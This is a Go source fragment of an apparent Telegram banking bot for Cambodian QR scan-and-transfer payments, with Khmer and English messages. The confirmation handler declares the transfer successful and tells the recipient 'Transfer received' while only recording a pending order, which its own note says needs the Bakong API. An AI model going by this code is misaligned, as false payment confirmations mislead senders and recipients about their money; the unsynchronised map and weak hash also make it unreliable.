		amtLine +
		"🌍 ប្រទេស: Cambodia\n\n"

	if qr.Amount != "" {
		text += "💸 សូមបញ្ជាក់ទឹកប្រាក់ ឬផ្ញើ `ok` ដើម្បីប្រើទឹកប្រាក់ក្នុង QR:"
	} else {
		text += "💸 សូមបញ្ចូលទឹកប្រាក់ដែលចង់ផ្ញើ (" + currency + "):\n\nឧទាហរណ៍: `150.00`"
	}

	return c.Send(text, tele.ModeMarkdown, backMenu())
}

// handleScanAmountInput saves the amount and shows a transfer confirmation summary.
func handleScanAmountInput(c tele.Context, userID int64) error {
	state := getState(userID)
	if state == nil {
		return nil
	}

	input := strings.TrimSpace(c.Message().Text)
	currency := state.phone // currency was stored in phone field
	if currency == "" {
		currency = "USD"
	}

	var amount string
	if input == "ok" || input == "OK" || input == "Ok" {
		// Use amount from QR — but we didn't store it. Re-decode would be needed.
		// For simplicity, ask again if amount was in QR.
		amount = ""
	} else {
		amount = input
	}

	if amount == "" {
		return c.Send("❌ សូមបញ្ចូលទឹកប្រាក់ ឬផ្ញើ `ok`។", backMenu())
	}

	// Move to confirmation step.
	setState(userID, &conversationState{
		step:    "scan_confirm",
		account: state.account,
		bank:    state.bank,
		name:    state.name,
		phone:   currency,
	})
	// Store amount in a way we can retrieve — we embed it in the state.
	// Since conversationState doesn't have an amount field, we reuse the
	// "name" field to carry both name and amount separated by "|".
	// Actually, let's just use a package-level map.
	scanAmounts[userID] = amount

	bankDisplay := state.bank
	if bankDisplay == "" {
		bankDisplay = "Unknown Bank"
	}
	nameDisplay := state.name
	if nameDisplay == "" {
		nameDisplay = "—"
	}

	text := "🔔 *បញ្ជាក់ការផ្ទេរប្រាក់ — Transfer Confirmation*\n\n" +
		"👤 អ្នកទទួល: *" + nameDisplay + "*\n" +
		"🏦 ធនាគារ: *" + bankDisplay + "*\n" +
		"🔖 គណនី: `" + state.account + "`\n" +
		"💰 ទឹកប្រាក់: *" + amount + " " + currency + "*\n\n" +
		"✅ ផ្ញើ `yes` ដើម្បីបញ្ជាក់ការផ្ទេរ\n" +
		"❌ ផ្ញើ `no` ដើម្បីបោះបង់"

	return c.Send(text, tele.ModeMarkdown, backMenu())
}

// scanAmounts temporarily stores the transfer amount per user during the scan flow.
var scanAmounts = make(map[int64]string)

// handleScanConfirmInput processes the transfer confirmation (yes/no).
func handleScanConfirmInput(c tele.Context, userID int64) error {
	state := getState(userID)
	if state == nil {
		return nil
	}

	input := strings.ToLower(strings.TrimSpace(c.Message().Text))
	if input != "yes" && input != "y" && input != "បាទ" && input != "បាត" {
		clearState(userID)
		delete(scanAmounts, userID)
		return c.Send("❌ ការផ្ទេរប្រាក់បានបោះបង់។\n\nTransfer cancelled.", bakongMenu())
	}

	amount := scanAmounts[userID]
	currency := state.phone
	if currency == "" {
		currency = "USD"
	}
	delete(scanAmounts, userID)
	clearState(userID)

	// Generate a unique transaction hash.
	hash := generateScanHash()

	// Create order in the database.
	if Store != nil {
		order := &db.Order{
			Hash:       hash,
			CustomerID: sql.NullInt64{Int64: userID, Valid: true},
			Amount:     sql.NullString{String: amount, Valid: true},
			Currency:   currency,
			Status:     "pending",
			Bank:       sql.NullString{String: state.bank, Valid: state.bank != ""},
			Receiver:   sql.NullString{String: state.name, Valid: state.name != ""},
			TxDate:     sql.NullString{String: time.Now().Format("2006-01-02"), Valid: true},
			TxID:       sql.NullString{String: "SCAN-" + hash[:8], Valid: true},
			Notes:      sql.NullString{String: "Scan & Transfer from bot", Valid: true},
		}
		if err := Store.UpsertOrder(order); err != nil {
			log.Printf("[scan] UpsertOrder error: %v", err)
			return c.Send("❌ មានបញ្ហាក្នុងការបង្កើត order។ សូមព្យាយាមម្ដងទៀត។", bakongMenu())
		}
		log.Printf("[scan] order created: hash=%s user=%d amount=%s %s receiver=%s@%s",
			hash, userID, amount, currency, state.name, state.bank)
	}

	nameDisplay := state.name
	if nameDisplay == "" {
		nameDisplay = "—"
	}
	bankDisplay := state.bank
	if bankDisplay == "" {
		bankDisplay = "Unknown Bank"
	}

	// Send push notification to the sender (confirmation)
	go func() {
		if services.GlobalPush != nil {
			txID := "SCAN-" + hash[:8]
			err := services.GlobalPush.SendTransferSent(
				userID,
				amount,
				currency,
				nameDisplay,
				txID,
			)
			if err != nil {
				log.Printf("[scan] failed to send push to sender %d: %v", userID, err)
			}
		}
	}()

	bot := c.Bot()

	// Send push notification to the recipient and a direct Telegram message when bound.
	go func() {
		if Store == nil {
			return
		}

		// Look up recipient's telegram ID by account number
		recipientID, err := Store.GetCustomerIDByAccount(state.account)
		if err != nil {
			log.Printf("[scan] failed to look up recipient for account %s: %v", state.account, err)
			return
		}
		if recipientID == 0 {
			log.Printf("[scan] no recipient found for account %s", state.account)
			return
		}

		// Don't send notification if sender and recipient are the same
		if recipientID == userID {
			return
		}

		// Get sender's display name
		senderName := "Wing Bank User"
		sender, err := Store.GetCustomerByID(userID)
		if err == nil && sender != nil {
			if sender.FirstName.Valid {
				senderName = sender.FirstName.String
				if sender.LastName.Valid {
					senderName += " " + sender.LastName.String
				}
			} else if sender.Username.Valid {
				senderName = "@" + sender.Username.String
			}
		}

		txID := "SCAN-" + hash[:8]

		if services.GlobalPush != nil {
			err = services.GlobalPush.SendTransferReceived(
				recipientID,
				amount,
				currency,
				senderName,
				txID,
			)
			if err != nil {
				log.Printf("[scan] failed to send push to recipient %d: %v", recipientID, err)
			} else {
				log.Printf("[scan] push notification sent to recipient %d", recipientID)
			}
		}

		if bot != nil {
			recipientMsg := "✅ Transfer received\n\n" +
				"Amount: " + amount + " " + currency + "\n" +
				"From: " + senderName + "\n" +
				"Bank: " + state.bank + "\n" +
				"Account: " + state.account + "\n" +
				"TX ID: " + txID + "\n\n" +
				"Thank you for using WING Bot."

			if _, sendErr := bot.Send(&tele.User{ID: recipientID}, recipientMsg); sendErr != nil {
				log.Printf("[scan] failed to send Telegram message to recipient %d: %v", recipientID, sendErr)
			} else {
				log.Printf("[scan] Telegram notification sent to recipient %d", recipientID)
			}
		}
	}()

	text := "✅ *ការផ្ទេរប្រាក់បានជោគជ័យ!*\n\n" +
		"🔖 Hash: `" + hash + "`\n" +
		"👤 អ្នកទទួល: *" + nameDisplay + "*\n" +
		"🏦 ធនាគារ: *" + bankDisplay + "*\n" +
		"🔖 គណនី: `" + state.account + "`\n" +
		"💰 ទឹកប្រាក់: *" + amount + " " + currency + "*\n" +
		"📅 កាលបរិច្ឆេទ: " + time.Now().Format("2006-01-02 15:04") + "\n" +
		"🔢 TX ID: SCAN-" + hash[:8] + "\n\n" +
		"📲 អ្នកទទួលនឹងទទួលបានសារជូនដំណឹង។\n" +
		"The recipient will be notified.\n\n" +
		"⚠️ សម្គាល់: ការផ្ទេរនេះត្រូវបានកត់ត្រា។ សម្រាប់ការផ្ទេរពិត សូមភ្ជាប់ជាមួយ BAkong API។"

	return c.Send(text, tele.ModeMarkdown, bakongMenu())
}

// generateScanHash creates a short unique hash for scan transactions.
func generateScanHash() string {
	now := time.Now()
	return fmt.Sprintf("scan%x%x", now.UnixNano()%0xFFFFFF, now.Unix()%0xFFFF)
}

// handleChatInput captures text typed during live chat mode.
// The user stays in chat mode until they click the end chat button.
func handleChatInput(c tele.Context, userID int64) error {
	msg := strings.TrimSpace(c.Message().Text)
	state := getState(userID)
	lang := "km"
	if state != nil && state.name != "" {
		lang = state.name
	}

	log.Printf("[live_chat] user=%d lang=%s msg=%q", userID, lang, msg)

	// Acknowledge the message in the selected language.
	var reply string
	switch lang {
	case "zh":
		reply = "✅ 您的消息已收到，客服团队正在查看。\n" +
			"请稍等，我们会尽快回复您。\n\n" +
			"您的消息: " + msg
	case "en":
		reply = "✅ Your message has been received. Our team is reviewing it.\n" +
			"Please wait, we will get back to you shortly.\n\n" +
			"Your message: " + msg
	default: // km
		reply = "✅ សាររបស់អ្នកបានទទួលហើយ។ ក្រុមការងារកំពុងពិនិត្យ។\n" +
			"សូមរង់ចាំ យើងនឹងឆ្លើយតបអ្នកក្នុងពេលឆាប់ៗនេះ។\n\n" +
			"សាររបស់អ្នក: " + msg
	}

	return c.Send(reply, chatMenu(lang))
}
